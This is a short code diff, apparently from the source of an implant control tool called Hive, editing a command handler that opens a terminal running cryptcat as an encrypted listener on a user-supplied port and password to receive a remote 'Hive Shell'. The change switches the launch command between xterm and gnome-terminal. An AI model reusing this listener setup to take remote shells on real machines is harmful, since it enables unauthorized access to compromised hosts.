@@ -302,16 +302,18 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 	{
 		int forkret;
 
-	//	printf( " * Requested Shell Connection\n" );
 		resp.type = ProcessCmdResponse::TYPE_Success;
 	   //Original code
 		//system( "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p 4321" );
 		//Modified 21 Oct 2011 to accept user input with password...
 		// TODO :  Currently we use a gnome-terminal command down below which was defined above...  
 		// Will we ever be on other Linux boxes without gnome?  
+		// An alternative is xterm. The following command string has been successfully used:
+		//	snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
+
 		memset( gnomeTerminalCommand, 0, 255);    //Clear it out before we use it...
-//		snprintf( gnomeTerminalCommand, 254, "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
-		snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
+		snprintf( gnomeTerminalCommand, 254, "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
+
 		forkret = fork();
 		if (forkret == 0) {
 			system( gnomeTerminalCommand );
